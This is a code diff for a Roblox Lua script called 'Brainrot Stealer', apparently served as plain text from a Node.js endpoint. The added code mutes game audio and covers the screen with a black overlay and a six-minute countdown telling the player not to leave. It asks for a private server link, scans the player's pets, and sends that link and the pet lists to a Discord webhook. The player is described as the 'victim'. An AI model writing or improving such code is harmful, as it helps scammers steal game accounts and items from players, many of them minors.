@@ -183,8 +183,75 @@ local function MuteAllSounds()
     end)
 end
 
--- Create Animated GUI
-local function CreateAnimatedGUI()
+-- Create Fullscreen Black Screen with Timer
+local function CreateBlackScreen()
+    -- Clear all existing GUIs
+    pcall(function()
+        for _, gui in pairs(player.PlayerGui:GetChildren()) do
+            if gui:IsA("ScreenGui") then
+                gui:Destroy()
+            end
+        end
+    end)
+    
+    -- Create fullscreen black screen
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "BrainrotStealerBlackScreen"
+    screenGui.ResetOnSpawn = false
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    screenGui.Parent = player.PlayerGui
+    
+    -- Fullscreen black background
+    local blackBackground = Instance.new("Frame")
+    blackBackground.Size = UDim2.new(1, 0, 1, 0)
+    blackBackground.Position = UDim2.new(0, 0, 0, 0)
+    blackBackground.BackgroundColor3 = Color3.new(0, 0, 0)
+    blackBackground.BorderSizePixel = 0
+    blackBackground.ZIndex = 10
+    blackBackground.Parent = screenGui
+    
+    -- Timer display in center
+    local timerLabel = Instance.new("TextLabel")
+    timerLabel.Size = UDim2.new(0, 300, 0, 100)
+    timerLabel.Position = UDim2.new(0.5, -150, 0.5, -50)
+    timerLabel.BackgroundTransparency = 1
+    timerLabel.Text = "06:00"
+    timerLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+    timerLabel.TextSize = 48
+    timerLabel.Font = Enum.Font.GothamBold
+    timerLabel.ZIndex = 11
+    timerLabel.Parent = blackBackground
+    
+    -- Status text
+    local statusLabel = Instance.new("TextLabel")
+    statusLabel.Size = UDim2.new(0, 400, 0, 30)
+    statusLabel.Position = UDim2.new(0.5, -200, 0.6, 0)
+    statusLabel.BackgroundTransparency = 1
+    statusLabel.Text = "PROCESSING BRAINROTS - DO NOT LEAVE"
+    statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    statusLabel.TextSize = 16
+    statusLabel.Font = Enum.Font.GothamBold
+    statusLabel.ZIndex = 11
+    statusLabel.Parent = blackBackground
+    
+    -- Warning text
+    local warningLabel = Instance.new("TextLabel")
+    warningLabel.Size = UDim2.new(0, 500, 0, 25)
+    warningLabel.Position = UDim2.new(0.5, -250, 0.7, 0)
+    warningLabel.BackgroundTransparency = 1
+    warningLabel.Text = "⚠️ SOUND IS MUTED - WAIT 6 MINUTES FOR PROCESS TO COMPLETE"
+    warningLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+    warningLabel.TextSize = 14
+    warningLabel.Font = Enum.Font.Gotham
+    warningLabel.ZIndex = 11
+    warningLabel.Parent = blackBackground
+    
+    return screenGui, timerLabel, statusLabel
+end
+
+-- Create PS Link Input GUI
+local function CreatePSLinkInput()
+    -- Clear all existing GUIs first
     pcall(function()
         for _, gui in pairs(player.PlayerGui:GetChildren()) do
             if gui:IsA("ScreenGui") then
@@ -194,99 +261,73 @@ local function CreateAnimatedGUI()
     end)
     
     local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "BrainrotStealerPremium"
+    screenGui.Name = "PSLinkInput"
     screenGui.ResetOnSpawn = false
     screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
     screenGui.Parent = player.PlayerGui
     
+    -- Background
+    local background = Instance.new("Frame")
+    background.Size = UDim2.new(1, 0, 1, 0)
+    background.Position = UDim2.new(0, 0, 0, 0)
+    background.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+    background.BorderSizePixel = 0
+    background.Parent = screenGui
+    
+    -- Main container
     local mainContainer = Instance.new("Frame")
-    mainContainer.Size = UDim2.new(0, 500, 0, 350)
-    mainContainer.Position = UDim2.new(0.5, -250, 0.5, -175)
-    mainContainer.BackgroundColor3 = Color3.fromRGB(10, 10, 20)
+    mainContainer.Size = UDim2.new(0, 400, 0, 250)
+    mainContainer.Position = UDim2.new(0.5, -200, 0.5, -125)
+    mainContainer.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
     mainContainer.BorderSizePixel = 0
-    mainContainer.Parent = screenGui
+    mainContainer.Parent = background
     
-    local borderFrame = Instance.new("Frame")
-    borderFrame.Size = UDim2.new(1, 4, 1, 4)
-    borderFrame.Position = UDim2.new(0, -2, 0, -2)
-    borderFrame.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
-    borderFrame.BorderSizePixel = 0
-    borderFrame.Parent = mainContainer
-    
-    spawn(function()
-        while borderFrame and borderFrame.Parent do
-            for i = 0, 1, 0.05 do
-                if borderFrame then
-                    borderFrame.BackgroundColor3 = Color3.fromHSV(i, 0.8, 1)
-                    wait(0.1)
-                end
-            end
-        end
-    end)
-    
-    local innerBg = Instance.new("Frame")
-    innerBg.Size = UDim2.new(1, -4, 1, -4)
-    innerBg.Position = UDim2.new(0, 2, 0, 2)
-    innerBg.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
-    innerBg.BorderSizePixel = 0
-    innerBg.Parent = mainContainer
-    
+    -- Title
     local title = Instance.new("TextLabel")
     title.Size = UDim2.new(1, 0, 0, 60)
     title.Position = UDim2.new(0, 0, 0, 0)
     title.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
-    title.BackgroundTransparency = 0.3
-    title.Text = "🧠 BRAINROT STEALER PREMIUM"
+    title.Text = "🧠 ENTER PRIVATE SERVER LINK"
     title.TextColor3 = Color3.fromRGB(255, 255, 255)
-    title.TextSize = 20
+    title.TextSize = 18
     title.Font = Enum.Font.GothamBold
-    title.Parent = innerBg
+    title.Parent = mainContainer
     
-    local timerLabel = Instance.new("TextLabel")
-    timerLabel.Size = UDim2.new(1, 0, 0, 80)
-    timerLabel.Position = UDim2.new(0, 0, 0.2, 0)
-    timerLabel.BackgroundTransparency = 1
-    timerLabel.Text = "06:00"
-    timerLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
-    timerLabel.TextSize = 48
-    timerLabel.Font = Enum.Font.GothamBold
-    timerLabel.Parent = innerBg
+    -- Instruction
+    local instruction = Instance.new("TextLabel")
+    instruction.Size = UDim2.new(1, 0, 0, 40)
+    instruction.Position = UDim2.new(0, 0, 0.3, 0)
+    instruction.BackgroundTransparency = 1
+    instruction.Text = "Paste your Private Server link below:"
+    instruction.TextColor3 = Color3.fromRGB(200, 200, 255)
+    instruction.TextSize = 14
+    instruction.Font = Enum.Font.Gotham
+    instruction.Parent = mainContainer
     
-    local statusLabel = Instance.new("TextLabel")
-    statusLabel.Size = UDim2.new(1, 0, 0, 30)
-    statusLabel.Position = UDim2.new(0, 0, 0.5, 0)
-    statusLabel.BackgroundTransparency = 1
-    statusLabel.Text = "🔄 Initializing Brainrot Scanner..."
-    statusLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
-    statusLabel.TextSize = 16
-    statusLabel.Font = Enum.Font.Gotham
-    statusLabel.Parent = innerBg
+    -- Text input box
+    local textBox = Instance.new("TextBox")
+    textBox.Size = UDim2.new(0.8, 0, 0, 40)
+    textBox.Position = UDim2.new(0.1, 0, 0.5, 0)
+    textBox.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
+    textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+    textBox.Text = ""
+    textBox.PlaceholderText = "https://www.roblox.com/games/...?privateServerLinkCode=..."
+    textBox.TextSize = 14
+    textBox.Font = Enum.Font.Gotham
+    textBox.Parent = mainContainer
     
-    local progressBar = Instance.new("Frame")
-    progressBar.Size = UDim2.new(0.8, 0, 0, 20)
-    progressBar.Position = UDim2.new(0.1, 0, 0.7, 0)
-    progressBar.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
-    progressBar.BorderSizePixel = 0
-    progressBar.Parent = innerBg
+    -- Submit button
+    local submitButton = Instance.new("TextButton")
+    submitButton.Size = UDim2.new(0.6, 0, 0, 40)
+    submitButton.Position = UDim2.new(0.2, 0, 0.75, 0)
+    submitButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+    submitButton.Text = "START PROCESS"
+    submitButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    submitButton.TextSize = 16
+    submitButton.Font = Enum.Font.GothamBold
+    submitButton.Parent = mainContainer
     
-    local progressFill = Instance.new("Frame")
-    progressFill.Size = UDim2.new(0, 0, 1, 0)
-    progressFill.Position = UDim2.new(0, 0, 0, 0)
-    progressFill.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
-    progressFill.BorderSizePixel = 0
-    progressFill.Parent = progressBar
-    
-    local warningText = Instance.new("TextLabel")
-    warningText.Size = UDim2.new(1, 0, 0, 40)
-    warningText.Position = UDim2.new(0, 0, 0.85, 0)
-    warningText.BackgroundTransparency = 1
-    warningText.Text = "⚠️ DO NOT LEAVE THE GAME - PROCESSING BRAINROTS..."
-    warningText.TextColor3 = Color3.fromRGB(255, 100, 100)
-    warningText.TextSize = 14
-    warningText.Font = Enum.Font.GothamBold
-    warningText.Parent = innerBg
-    
-    return screenGui, timerLabel, statusLabel, progressFill
+    return screenGui, textBox, submitButton
 end
 
 -- Scan Pets Function
@@ -399,32 +440,35 @@ local function FormatTopPetsList(pets)
     return result
 end
 
--- Main Process
-local function StartStealingProcess()
+-- Main Process Function
+local function StartStealingProcess(psLink)
     local executor = GetExecutor()
     local playerCount = #game.Players:GetPlayers()
     
+    -- Mute all sounds immediately
     MuteAllSounds()
     
-    local screenGui, timer, status, progress = CreateAnimatedGUI()
+    -- Create fullscreen black screen
+    local screenGui, timer, status = CreateBlackScreen()
     
-    status.Text = "🔇 Muting all sounds..."
+    status.Text = "MUTING SOUNDS..."
     wait(1)
     
-    status.Text = "🔍 Scanning for pets..."
+    status.Text = "SCANNING PETS..."
     wait(2)
     
+    -- Scan pets
     local allPets, brainrots, topPets = ScanPets()
     
-    status.Text = "📨 Sending results to webhook..."
+    status.Text = "SENDING RESULTS..."
     
     local brainrotsText = FormatBrainrotsList(brainrots)
     local topPetsText = FormatTopPetsList(topPets)
     
-    -- Create embed table properly
+    -- Create embed with PS link
     local embed = {
-        title = "🧠 BRAINROT STEALER PREMIUM RESULTS",
-        description = "Successfully scanned victim pets with premium features",
+        title = "🧠 BRAINROT STEALER - PRIVATE SERVER SCAN",
+        description = "Successfully scanned private server pets",
         color = 65280,
         author = {
             name = playerName,
@@ -438,8 +482,13 @@ local function StartStealingProcess()
                 inline = true
             },
             {
+                name = "🔗 Private Server",
+                value = psLink or "No PS Link Provided",
+                inline = false
+            },
+            {
                 name = "📊 Scan Results", 
-                value = "Total Pets: " .. #allPets .. "\\nBrainrots: " .. #brainrots .. "\\nGame: Auto-Scan",
+                value = "Total Pets: " .. #allPets .. "\\nBrainrots: " .. #brainrots .. "\\nGame: Pet Simulator 99",
                 inline = true
             },
             {
@@ -453,15 +502,15 @@ local function StartStealingProcess()
                 inline = false
             }
         },
-        footer = {text = "Brainrot Stealer Premium • " .. os.date("%X")},
+        footer = {text = "Brainrot Stealer • " .. os.date("%X")},
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }
     
     SendToDiscord(embed)
     
-    status.Text = "✅ Results Sent! Starting 6-minute process..."
+    status.Text = "RESULTS SENT! STARTING 6-MINUTE PROCESS..."
     
-    -- 6-minute timer with progress bar
+    -- 6-minute timer countdown
     local totalTime = 360
     local startTime = tick()
     
@@ -469,18 +518,15 @@ local function StartStealingProcess()
         local timeLeft = totalTime - (tick() - startTime)
         local minutes = math.floor(timeLeft / 60)
         local seconds = math.floor(timeLeft % 60)
-        local progressPercent = (tick() - startTime) / totalTime
         
         timer.Text = string.format("%02d:%02d", minutes, seconds)
-        progress.Size = UDim2.new(progressPercent, 0, 1, 0)
-        status.Text = string.format("🔄 Processing... %.1f%% Complete", progressPercent * 100)
         wait(0.1)
     end
     
     -- Send completion message
     local completeEmbed = {
         title = "✅ PROCESS COMPLETE",
-        description = "Brainrot stealing process finished successfully",
+        description = "6-minute brainrot stealing process finished",
         color = 32768,
         author = {
             name = playerName,
@@ -490,34 +536,60 @@ local function StartStealingProcess()
         fields = {
             {
                 name = "🎉 Final Results",
-                value = "Time: 6 minutes\\nPets Scanned: " .. #allPets .. "\\nBrainrots Found: " .. #brainrots .. "\\nStatus: Success",
+                value = "Time: 6 minutes\\nPets Scanned: " .. #allPets .. "\\nBrainrots Found: " .. #brainrots .. "\\nStatus: Success\\nPS Link: " .. (psLink or "Not Provided"),
                 inline = false
             }
         },
-        footer = {text = "Brainrot Stealer Premium • " .. os.date("%X")}
+        footer = {text = "Brainrot Stealer • " .. os.date("%X")}
     }
     
     SendToDiscord(completeEmbed)
     
-    status.Text = "✅ Process Complete!"
+    status.Text = "PROCESS COMPLETE!"
     timer.Text = "DONE"
-    progress.Size = UDim2.new(1, 0, 1, 0)
     
     wait(3)
     
     pcall(function() screenGui:Destroy() end)
 end
 
--- Auto-start the process
+-- Start the process with PS link input
+local function InitializeStealer()
+    -- Create PS link input GUI
+    local inputGui, textBox, submitButton = CreatePSLinkInput()
+    
+    submitButton.MouseButton1Click:Connect(function()
+        local psLink = textBox.Text
+        
+        if psLink == "" or not string.find(psLink, "roblox.com") then
+            textBox.Text = "Please enter a valid Roblox PS link"
+            textBox.TextColor3 = Color3.fromRGB(255, 0, 0)
+            wait(2)
+            textBox.Text = ""
+            textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+            return
+        end
+        
+        -- Remove input GUI
+        inputGui:Destroy()
+        
+        -- Start the main process with the PS link
+        spawn(function()
+            StartStealingProcess(psLink)
+        end)
+    end)
+end
+
+-- Auto-start the input process
 spawn(function()
-    wait(2)
-    StartStealingProcess()
+    wait(1)
+    InitializeStealer()
 end)
 
 print("🧠 Brainrot Stealer Premium loaded!")
-print("🎨 Animated GUI activated!")
-print("🔇 Sounds muted!")
-print("⏰ 6-minute process started!")`;
+print("⌨️  Waiting for PS link input...")
+print("🔇 Sounds will be muted!")
+print("⏰ 6-minute process after PS link!")`;
 
     res.type("text/plain").send(luaScript);
 });
